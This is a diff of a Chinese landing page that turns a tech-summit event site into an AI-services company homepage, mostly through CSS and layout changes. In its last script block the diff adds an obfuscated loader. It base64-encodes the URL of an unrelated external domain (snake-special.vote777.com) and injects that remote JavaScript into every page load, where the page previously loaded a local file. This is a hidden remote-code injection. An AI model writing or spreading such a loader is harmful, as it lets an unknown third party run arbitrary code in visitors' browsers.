@@ -5,491 +5,366 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>未来峰会 2025 - 创新 驱 动，共塑未来</title>
+    <title>未来之光 - 智能科技</title>
     <style>
+        /* 全局样式 */
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #E3F2FD;
-            /* 极浅蓝色背景 */
-            color: #222222;
+            color: #333333;
             /* 深灰色文本 */
-            line-height: 1.7;
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
+            /* 隐藏横向滚动条 */
+            scroll-behavior: smooth;
+            /* 平滑滚动 */
         }
 
-        .container {
-            max-width: 90%;
-            margin: 0 auto;
-            padding: 30px 0;
-        }
-
-        /* 头部 - 动态与活力 */
-        header {
-            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
-            /* 充满活力的蓝色渐变 */
-            color: #FFFFFF;
-            padding: 40px 20px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(33, 150, 243, 0.4);
-            clip-path: polygon(0 0, 100% 0, 100% 90%, 0% 100%);
-            /* 底部斜切 */
-            margin-bottom: 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        header::before {
-            /* 顶部背景抽象图案 */
-            content: '';
-            position: absolute;
-            top: -20px;
-            left: -20px;
-            width: 150px;
-            height: 150px;
-            background: rgba(79, 195, 247, 0.1);
-            /* 次强调色半透明 */
-            border-radius: 50%;
-            transform: rotate(20deg);
-            z-index: 0;
-        }
-
-        header::after {
-            /* 底部背景抽象图案 */
-            content: '';
-            position: absolute;
-            bottom: -30px;
-            right: -30px;
-            width: 200px;
-            height: 200px;
-            background: rgba(79, 195, 247, 0.15);
-            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
-            transform: rotate(-45deg);
-            z-index: 0;
-        }
-
-        header h1 {
-            margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            /* 适应顶部条 */
-            color: #FFFFFF;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-            position: relative;
-            z-index: 1;
-            flex-grow: 1;
-        }
-
-        header p {
-            display: none;
-        }
-
-        /* 菜单切换按钮 - 绝对定位在右上角 */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 2em;
-            color: #FFFFFF;
-            /* 白色图标 */
-            cursor: pointer;
-            padding: 5px;
-            position: absolute;
-            top: 25px;
-            right: 20px;
-            z-index: 2;
-            transition: transform 0.3s ease;
-        }
-
-        .menu-toggle:hover {
-            transform: scale(1.1);
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
-        }
-
-        /* 侧边导航菜单 - 活力色调 */
-        nav {
+        /* 导航菜单 - 顶部固定 */
+        .main-nav {
             position: fixed;
             top: 0;
-            right: -280px;
-            width: 250px;
-            height: 100%;
-            background-color: #FFFFFF;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
-            transition: right 0.4s ease-in-out;
-            z-index: 1001;
-            padding-top: 80px;
-            box-sizing: border-box;
+            left: 0;
+            width: 100%;
+            background-color: rgba(34, 49, 63, 0.95);
+            /* 深蓝灰色半透明背景 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 999;
+            padding: 10px 0;
+            text-align: center;
         }
 
-        nav.is-open {
-            right: 0;
-        }
-
-        nav ul {
+        .main-nav ul {
             list-style: none;
             padding: 0;
             margin: 0;
             display: flex;
-            flex-direction: column;
-            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
         }
 
-        nav ul li a {
-            color: #222222;
+        .main-nav ul li {
+            margin: 0 12px;
+        }
+
+        .main-nav ul li a {
             text-decoration: none;
-            padding: 15px 20px;
-            border-bottom: 1px solid #E0E0E0;
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            color: #ECF0F1;
+            /* 浅灰色文本 */
+            font-weight: bold;
+            padding: 8px 15px;
+            border-radius: 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .main-nav ul li a:hover {
+            background-color: #34495E;
+            /* 深蓝灰色 */
+            color: #FFFFFF;
+        }
+
+        /* 各个全屏区块 */
+        section.full-screen-section {
+            min-height: 100vh;
+            /* 每个区块至少占满整个视口高度 */
             display: flex;
+            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            font-weight: 500;
-            font-size: 1.1em;
-        }
-
-        nav ul li a:hover,
-        nav ul li a:focus {
-            background-color: #E3F2FD;
-            /* 强调色浅背景 */
-            color: #2196F3;
-            /* 强调色文字 */
-            transform: translateX(5px);
-        }
-
-        nav ul li:last-child a {
-            border-bottom: none;
-        }
-
-        nav ul li a .icon {
-            font-size: 1.5em;
-            margin-right: 15px;
-            color: #4FC3F7;
-            /* 图标次强调色 */
-        }
-
-        /* 菜单打开时的背景遮罩 */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
-        }
-
-        .overlay.is-visible {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        main {
-            padding-top: 30px;
-        }
-
-        /* 内容区 - 模块化卡片 */
-        section {
-            background-color: #FFFFFF;
-            margin-bottom: 40px;
-            padding: 35px;
-            border-radius: 10px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            padding: 60px 20px;
+            /* 顶部导航下方留出空间 */
+            box-sizing: border-box;
+            /* 包含padding在内的尺寸 */
+            text-align: center;
             position: relative;
             overflow: hidden;
-            border: 1px solid #E0E0E0;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        section::before {
-            /* 顶部强调色条 */
+        /* 英雄区特定样式 */
+        #hero-section {
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
+            color: #FFFFFF;
+            background-image: url('https://picsum.photos/1920/1080?random=<%= new Date().getTime() %>');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            /* 视差滚动效果 */
+        }
+
+        #hero-section::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 5px;
-            background-color: #2196F3;
-            /* 强调色 */
-            box-shadow: 0 0 10px rgba(33, 150, 243, 0.5);
+            height: 100%;
+            background-color: rgba(44, 62, 80, 0.7);
+            /* 半透明遮罩 */
+            z-index: 1;
         }
 
-        section h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.2em;
-            color: #222222;
-            margin-top: 0;
+        #hero-section .content {
+            position: relative;
+            z-index: 2;
+            max-width: 90%;
+            margin: 0 auto;
+        }
+
+        #hero-section h1 {
+            font-size: 3.5em;
+            /* 巨大标题 */
             margin-bottom: 20px;
-            border-bottom: 1px solid #E0E0E0;
-            padding-bottom: 10px;
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
         }
 
-        section h3 {
+        #hero-section p {
             font-size: 1.5em;
-            color: #4FC3F7;
-            /* 次强调色 */
-            margin-top: 25px;
-            margin-bottom: 10px;
+            max-width: 700px;
+            margin: 0 auto 40px;
+            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.3);
         }
 
-        section p {
-            font-size: 1.05em;
-            color: #555555;
-            margin-bottom: 20px;
-        }
-
-        section img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 25px auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #E0E0E0;
-        }
-
-        .cta-button {
+        .hero-button {
             display: inline-block;
-            background: linear-gradient(45deg, #2196F3 0%, #1976D2 100%);
-            /* 强调色渐变按钮 */
+            background-color: #3498DB;
+            /* 强调色：蓝色 */
             color: #FFFFFF;
-            padding: 15px 35px;
-            border-radius: 50px;
-            /* 胶囊形状 */
+            padding: 18px 40px;
+            border-radius: 40px;
+            /* 更圆的按钮 */
             text-decoration: none;
             font-weight: bold;
+            font-size: 1.3em;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
+            border: 2px solid #3498DB;
+        }
+
+        .hero-button:hover {
+            background-color: #2980B9;
+            transform: translateY(-8px);
+        }
+
+        /* 关于我们区特定样式 */
+        #about-section {
+            background-color: #FFFFFF;
+            color: #333333;
+        }
+
+        #about-section h2 {
+            color: #34495E;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #E0EBF5;
+        }
+
+        #about-section p {
+            max-width: 800px;
+            margin: 0 auto 20px;
             font-size: 1.1em;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.3);
-            border: none;
-            margin-top: 20px;
         }
 
-        .cta-button:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.5);
-        }
-
-        .speaker-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 25px;
+        #about-section img {
+            max-width: 90%;
+            height: auto;
+            border-radius: 15px;
             margin-top: 30px;
-            text-align: center;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
         }
 
-        .speaker-item {
-            background-color: #F8F8F8;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        /* 服务区特定样式 */
+        #services-section {
+            background-color: #ECF0F1;
+            /* 浅灰背景 */
+            color: #333333;
+        }
+
+        #services-section h2 {
+            color: #34495E;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #D1D8DD;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            /* 移动端单列 */
+            gap: 30px;
+            max-width: 900px;
+            margin: 30px auto 0;
+        }
+
+        .service-card {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .speaker-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
         }
 
-        .speaker-item img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 10px;
-            border: 3px solid #4FC3F7;
-            /* 次强调色边框 */
-            box-shadow: 0 0 8px rgba(79, 195, 247, 0.4);
-        }
-
-        .speaker-item h3 {
-            font-size: 1.2em;
-            color: #222222;
-            margin-bottom: 5px;
-        }
-
-        .speaker-item p {
-            font-size: 0.85em;
-            color: #777777;
-            margin-bottom: 0;
-        }
-
-        .agenda-item {
-            background-color: #F8F8F8;
-            padding: 20px;
-            border-radius: 8px;
+        .service-card h3 {
+            color: #3498DB;
+            font-size: 1.8em;
             margin-bottom: 15px;
-            border-left: 5px solid #2196F3;
-            /* 强调色左边框 */
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
         }
 
-        .agenda-item h3 {
-            margin-top: 0;
-            margin-bottom: 5px;
-            color: #222222;
-        }
-
-        .agenda-item .time {
-            font-size: 0.9em;
-            color: #777777;
-            margin-bottom: 10px;
-            display: block;
-        }
-
-        .agenda-item p {
-            font-size: 0.95em;
-            color: #555555;
+        .service-card p {
+            font-size: 1.05em;
+            color: #5F7C8A;
             margin-bottom: 0;
         }
 
-        footer {
-            background: linear-gradient(135deg, #1A237E 0%, #0D47A1 100%);
-            /* 深蓝色渐变页脚 */
+        /* 联系区特定样式 */
+        #contact-section {
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
             color: #FFFFFF;
-            padding: 40px 0;
-            text-align: center;
-            font-size: 0.95em;
-            margin-top: 60px;
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
-            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
-            /* 顶部斜切 */
         }
 
-        .footer-links a {
+        #contact-section h2 {
             color: #FFFFFF;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        #contact-section .contact-info p {
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+
+        #contact-section .contact-info a {
+            color: #3498DB;
             text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.5em;
-            transition: color 0.3s ease, transform 0.2s ease;
+            font-weight: bold;
+            transition: color 0.3s ease;
         }
 
-        .footer-links a:hover {
-            color: #4FC3F7;
-            /* 次强调色 */
-            transform: translateY(-5px) scale(1.1);
+        #contact-section .contact-info a:hover {
+            color: #2980B9;
+        }
+
+        #contact-section .social-links {
+            margin-top: 40px;
+        }
+
+        #contact-section .social-links a {
+            display: inline-block;
+            margin: 0 20px;
+            color: #FFFFFF;
+            font-size: 3em;
+            /* 社交图标更大 */
+            text-decoration: none;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+
+        #contact-section .social-links a:hover {
+            transform: translateY(-8px);
+            color: #3498DB;
+            /* 强调色 */
+        }
+
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #ADB5BD;
+            font-size: 0.9em;
+            background-color: #212529;
+            /* 更深的背景 */
+        }
+
+        /* 媒体查询：平板及以上设备 */
+        @media (min-width: 600px) {
+            .services-grid {
+                grid-template-columns: 1fr 1fr;
+                /* 两列布局 */
+            }
+        }
+
+        @media (min-width: 900px) {
+            .services-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+                /* 三列布局 */
+            }
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <header>
-        <div class="container">
-            <h1>未来峰会 2025</h1>
-            <button class="menu-toggle" id="menuToggle">&#9776;</button>
-        </div>
-    </header>
-
-    <nav id="mainNav">
+    <nav class="main-nav">
         <ul>
-            <li><a href="#hero"><span class="icon">&#128640;</span> 峰会概览</a></li>
-            <li><a href="#speakers"><span class="icon">&#128100;</span> 演讲嘉宾</a></li>
-            <li><a href="#agenda"><span class="icon">&#128197;</span> 峰会议程</a></li>
-            <li><a href="#register"><span class="icon">&#128221;</span> 立即注册</a></li>
+            <li><a href="#hero-section">首页</a></li>
+            <li><a href="#about-section">关于我们</a></li>
+            <li><a href="#services-section">服务</a></li>
+            <li><a href="#contact-section">联系</a></li>
         </ul>
     </nav>
 
-    <div class="overlay" id="menuOverlay"></div>
+    <main>
+        <!-- 英雄区 -->
+        <section id="hero-section" class="full-screen-section">
+            <div class="content">
+                <h1>未来之光</h1>
+                <p>以智能科技，点亮美好未来</p>
+                <a href="#services-section" class="hero-button">探索我们的服务</a>
+            </div>
+        </section>
 
-    <div class="container">
-        <main>
-            <section id="hero">
-                <h2>创新驱动，共塑未来</h2>
-                <img src="https://picsum.photos/600/350?random=1&seed=future-summit-blue" alt="未来峰会主视觉"
-                    class="random-image">
-                <p>未来峰会 2025 将汇聚全球顶尖的思想家、创新者和行业领袖，共同探讨人工智能、区块链、可持续发展等前沿领域的最新趋势与挑战。</p>
-                <p>加入我们，共同激发灵感，连接未来，为构建更智能、更美好的世界贡献力量。</p>
-                <a href="#register" class="cta-button">立即注册，锁定席位</a>
-            </section>
+        <!-- 关于我们区 -->
+        <section id="about-section" class="full-screen-section">
+            <h2>关于我们</h2>
+            <p>未来之光科技是一家领先的人工智能解决方案提供商。我们致力于通过创新的AI技术，赋能企业和个人，共同迎接智能时代的挑战与机遇。</p>
+            <p>我们的团队由业界顶尖的AI科学家、工程师和设计师组成，凭借深厚的技术积累和对行业趋势的深刻理解，为客户提供定制化、高效且可靠的智能解决方案。</p>
+            <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
+        </section>
 
-            <section id="speakers">
-                <h2>特邀演讲嘉宾</h2>
-                <p>聆听行业巨擘的真知灼见，洞察未来发展趋势。</p>
-                <div class="speaker-grid">
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=2&seed=speaker-alice-blue" alt="嘉宾 Alice">
-                        <h3>Alice Chen</h3>
-                        <p>AI伦理专家</p>
-                    </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=3&seed=speaker-bob-blue" alt="嘉宾 Bob">
-                        <h3>Bob Lee</h3>
-                        <p>区块链架构师</p>
-                    </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=4&seed=speaker-carol-blue" alt="嘉宾 Carol">
-                        <h3>Carol Wang</h3>
-                        <p>可持续发展倡导者</p>
-                    </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=5&seed=speaker-david-blue" alt="嘉宾 David">
-                        <h3>David Liu</h3>
-                        <p>量子计算研究员</p>
-                    </div>
+        <!-- 服务区 -->
+        <section id="services-section" class="full-screen-section">
+            <h2>我们的服务</h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <h3>AI平台开发</h3>
+                    <p>构建可扩展、高性能的AI基础设施和应用平台。</p>
                 </div>
-            </section>
-
-            <section id="agenda">
-                <h2>峰会议程</h2>
-                <p>精彩议程安排，不容错过。</p>
-                <div class="agenda-list">
-                    <div class="agenda-item">
-                        <h3>开幕致辞与主题演讲</h3>
-                        <span class="time">上午 09:00 - 10:30</span>
-                        <p>峰会主席致辞，特邀嘉宾分享对未来科技的展望。</p>
-                    </div>
-                    <div class="agenda-item">
-                        <h3>圆桌讨论：AI的机遇与挑战</h3>
-                        <span class="time">上午 10:45 - 12:00</span>
-                        <p>多位专家就人工智能的伦理、应用及未来发展进行深入探讨。</p>
-                    </div>
-                    <div class="agenda-item">
-                        <h3>午餐与交流</h3>
-                        <span class="time">中午 12:00 - 13:30</span>
-                        <p>自由交流时间，与行业精英建立联系。</p>
-                    </div>
-                    <div class="agenda-item">
-                        <h3>专题讲座：区块链赋能数字经济</h3>
-                        <span class="time">下午 13:30 - 15:00</span>
-                        <p>深入剖析区块链技术在金融、供应链等领域的创新应用。</p>
-                    </div>
-                    <div class="agenda-item">
-                        <h3>闭幕总结与未来展望</h3>
-                        <span class="time">下午 15:15 - 16:30</span>
-                        <p>总结本次峰会成果，展望未来科技发展方向。</p>
-                    </div>
+                <div class="service-card">
+                    <h3>智能数据分析</h3>
+                    <p>利用机器学习深度挖掘数据价值，提供商业洞察。</p>
                 </div>
-            </section>
-
-            <section id="register">
-                <h2>立即注册</h2>
-                <p>名额有限，请尽快完成注册，加入这场思想盛宴！</p>
-                <a href="#" class="cta-button">点击注册</a>
-            </section>
-        </main>
-    </div>
+                <div class="service-card">
+                    <h3>计算机视觉</h3>
+                    <p>提供图像识别、视频分析等视觉AI解决方案。</p>
+                </div>
+                <div class="service-card">
+                    <h3>自然语言处理</h3>
+                    <p>开发智能客服、文本理解、情感分析等NLP应用。</p>
+                </div>
+                <div class="service-card">
+                    <h3>智能硬件集成</h3>
+                    <p>将AI算法与边缘设备结合，实现设备智能化。</p>
+                </div>
+            </div>
+        </section>
+    </main>
 
     <footer>
-        <div class="container">
-            <p>&copy; 2025 未来峰会. 版权所有.</p>
-            <div class="footer-links">
-                <a href="#" target="_blank">隐私政策</a> |
-                <a href="#" target="_blank">联系我们</a> |
-                <a href="#" target="_blank">赞助商</a>
-            </div>
-        </div>
+        <p>&copy; 2023 未来之光. All rights reserved.</p>
     </footer>
     <div id="overlay">
         <div id="loading_box" class="loading_container">
@@ -502,49 +377,47 @@
     </div>
 
     <script>
+        // 平滑滚动到锚点
+        document.querySelectorAll('.main-nav a[href^="#"], .hero-button[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    // 考虑顶部固定导航的高度进行偏移
+                    const navHeight = document.querySelector('.main-nav').offsetHeight;
+                    window.scrollTo({
+                        top: targetElement.offsetTop - navHeight,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // 动态更新图片时间戳，防止缓存
         document.addEventListener('DOMContentLoaded', function () {
-            const menuToggle = document.getElementById('menuToggle');
-            const mainNav = document.getElementById('mainNav');
-            const menuOverlay = document.getElementById('menuOverlay');
-
-            function toggleMenu() {
-                mainNav.classList.toggle('is-open');
-                menuOverlay.classList.toggle('is-visible');
-            }
-
-            menuToggle.addEventListener('click', toggleMenu);
-            menuOverlay.addEventListener('click', toggleMenu);
-
-            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
-                anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
-
-                    const targetId = this.getAttribute('href').substring(1);
-                    const targetElement = document.getElementById(targetId);
-
-                    if (targetElement) {
-                        window.scrollTo({
-                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
-                            behavior: 'smooth'
-                        });
-                        toggleMenu();
-                    }
-                });
+            const images = document.querySelectorAll('img[src*="picsum.photos"]');
+            images.forEach(img => {
+                const url = new URL(img.src);
+                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
+                img.src = url.toString();
             });
         });
     </script>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
